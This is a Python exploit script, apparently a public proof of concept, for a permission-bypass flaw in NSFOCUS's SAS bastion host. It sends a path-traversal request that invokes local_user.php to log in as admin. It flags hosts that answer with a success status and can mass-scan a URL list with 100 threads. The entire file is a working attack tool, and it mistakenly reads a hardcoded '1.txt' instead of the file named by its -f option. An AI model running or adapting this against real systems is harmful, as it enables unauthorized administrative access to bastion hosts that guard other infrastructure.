import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
    __        __  ___                                      
   / / _   __/  |/  /__  ____  ____ _      _________ ______
  / / | | / / /|_/ / _ \/ __ \/ __ `/_____/ ___/ __ `/ ___/
 / /__| |/ / /  / /  __/ / / / /_/ /_____(__  ) /_/ (__  ) 
/_____/___/_/  /_/\___/_/ /_/\__, /     /____/\__,_/____/  
                            /____/                         
"""
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="绿盟SAS堡垒机local_user.php权限绕过漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip',
        'Connection':'close',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False)
        if res.status_code==200 and '{"status":200}' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()